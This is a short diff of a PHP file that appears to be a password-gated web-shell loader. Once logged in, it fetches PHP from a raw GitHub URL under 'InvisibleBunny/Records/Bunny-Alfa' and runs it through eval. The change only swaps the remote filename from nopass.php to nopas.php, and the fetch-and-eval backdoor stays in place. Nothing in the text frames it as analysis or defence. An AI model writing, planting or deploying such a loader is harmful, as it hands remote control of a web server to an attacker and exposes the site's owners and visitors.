@@ -55,7 +55,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://raw.githubusercontent.com/InvisibleBunny/Records/main/Bunny-Alfa/nopass.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/InvisibleBunny/Records/main/Bunny-Alfa/nopas.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
